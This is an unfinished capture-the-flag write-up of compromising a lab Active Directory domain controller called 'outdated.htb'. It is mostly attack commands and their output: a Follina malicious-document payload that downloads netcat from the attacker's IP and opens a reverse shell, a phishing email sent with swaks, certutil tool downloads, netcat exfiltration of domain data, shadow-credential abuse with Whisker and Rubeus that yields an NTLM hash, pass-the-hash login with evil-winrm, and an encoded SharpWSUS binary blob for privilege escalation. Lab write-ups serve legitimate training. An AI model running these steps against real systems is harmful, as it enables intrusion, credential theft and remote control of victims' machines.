# IN PROGRESS

### Tools: smbclient, swaks, follina.py, SharpWSUS

```console
└──╼ [★]$ nmap -A -p- -T4 -Pn 10.129.56.38
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 16:37 BST
Nmap scan report for 10.129.56.38
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-14 22:47:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp  open  unknown
49667/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49928/tcp open  msrpc         Microsoft Windows RPC
49949/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2022-09-14T22:48:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 710.25 seconds
```


```console
└──╼ [★]$ smbclient -L //outdated.htb -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
	UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
	WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
	WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
SMB1 disabled -- no workgroup available
```


```console
└──╼ [★]$ smbclient  //outdated.htb/Shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 20 16:01:33 2022
  ..                                  D        0  Mon Jun 20 16:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 16:00:32 2022

		9116415 blocks of size 4096. 1683888 blocks available
smb: \> get NOC_Reminder.pdf 
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (687.3 KiloBytes/sec) (average 687.3 KiloBytes/sec)
smb: \> quit
```

![image](https://user-images.githubusercontent.com/105310322/190208631-9d1ac727-8836-4db3-b089-28bb0edcc4c5.png)


https://github.com/JohnHammond/msdt-follina

sudo vim /etc/hosts
outdated.htb mail.outdated.htb
```
└─$ sudo python3 follina.py -i 10.10.16.8 -p 80 -c "Invoke-WebRequest http://10.10.16.8/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.16.8 1234"
[+] copied staging doc /tmp/tuqxmos9
[+] created maldoc ./follina.doc
[+] serving html payload on :80
10.129.57.67 - - [17/Sep/2022 13:29:33] "GET / HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:29:37] code 404, message File not found
10.129.57.67 - - [17/Sep/2022 13:29:37] "GET /nc64.exe HTTP/1.1" 404 -
10.129.57.67 - - [17/Sep/2022 13:30:45] "GET / HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:30:45] "GET / HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:30:46] "GET /nc64.exe HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:30:46] "GET / HTTP/1.1" 200 -
```
```
└─$ sudo cp nc64.exe /tmp/tuqxmos9/www
```
```
└─$ sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.16.8/"
```

```
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49885
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>whoami
whoami
outdated\btables

C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>S
```

![image](https://user-images.githubusercontent.com/105310322/190871592-ebc4c3ea-140d-4063-b9ea-0f4fe245d93a.png)

https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHound4.ps1

copy and paste base64 code into a txt file

cat sharp.txt | base64 -d sharp.gz
gzip -d sharp.gz

mkdir C:\\temp
certutil -urlcache -f http://10.10.16.8:8000/sharp.exe sharp.exe
```
C:\temp>sharp.exe -c All --zipfilename sharp.zip
sharp.exe -c All --zipfilename sharp.zip
2022-09-17T18:40:29.1352817-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-17T18:40:29.6040263-07:00|INFORMATION|Initializing SharpHound at 6:40 PM on 9/17/2022
2022-09-17T18:40:37.1213132-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-17T18:40:39.4383137-07:00|INFORMATION|Beginning LDAP search for outdated.htb
2022-09-17T18:40:39.5728042-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-09-17T18:40:39.5728042-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-09-17T18:41:11.6353570-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2022-09-17T18:41:38.3852031-07:00|INFORMATION|Consumers finished, closing output channel
2022-09-17T18:41:38.5570555-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-09-17T18:41:39.7760241-07:00|INFORMATION|Status: 64 objects finished (+64 1.066667)/s -- Using 45 MB RAM
Closing writers
2022-09-17T18:41:45.6975730-07:00|INFORMATION|Status: 97 objects finished (+33 1.469697)/s -- Using 44 MB RAM
2022-09-17T18:41:45.6975730-07:00|INFORMATION|Enumeration finished in 00:01:06.5847368
2022-09-17T18:41:47.4040166-07:00|INFORMATION|SharpHound Enumeration Completed at 6:41 PM on 9/17/2022! Happy Graphing!

C:\temp>
```

Transferring files in powershell was giving an error for using < with nc so I opted to use CMD

```
C:\temp>C:\\windows\\tasks\\nc.exe 10.10.16.8 1235 < 20220917184029_sharp.zip
```
```
└─$ nc -lvnp 1235 > sharp.zip
listening on [any] 1235 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49802
```

└─$ sudo neo4j console 

Analyzing the Shortest Path to unconstrained data systems

![image](https://user-images.githubusercontent.com/105310322/190872497-68e612ae-0c0a-4b73-a31b-734d86012adb.png)

Shadow Credentials

https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1

└─$ cat whisker.txt | base64 -d > whisker.gz
                                                                            
(base) ┌──(rogue1㉿rogue1)-[~/Downloads]
└─$ gzip -d whisker.gz 

Rubeus.exe can be got here

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries           

certutil -urlcache -f http://10.10.16.8:8000/whisker whisker.exe
certutil -urlcache -f http://10.10.16.8:8000/Rubeus.exe rubeus.exe


```console
PS C:\temp> ./whisker.exe add /target:sflowers
./whisker.exe add /target:sflowers
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password cftQUPqaPEblJvX1
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 7efb132a-c598-4b83-9781-962477aa5896
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate: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 /password:"cftQUPqaPEblJvX1" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
PS C:\temp> 
```
Run the output from whisker and rubeus will do its work.

```console
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  9/17/2022 7:15:14 PM
  EndTime                  :  9/18/2022 5:15:14 AM
  RenewTill                :  9/24/2022 7:15:14 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  lzfmBNm/4pMMdM0KtrEqjg==
  ASREP (key)              :  0A7B7D2B7BA939A4C27AF3AB1020EF3A

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

Now using the NTLM hash we can login via evil-winrm!


```console
└─$ evil-winrm -i 10.129.57.67 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sflowers\Documents> 
```


https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1

└──╼ [★]$ evil-winrm -i 10.129.56.140 -u sflowers -H 1fcdb1f6015dcb318cc77bb2bda14db5
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    WSUS is using http: http://wsus.outdated.htb:8530
È You can test https://github.com/pimps/wsuxploit to escalate privileges
    And UseWUServer is equals to 1, so it is vulnerable!
```

cat base64 | base64 -d > SharpWSUS.gz 

gzip -d SharpWSUS.gz

```
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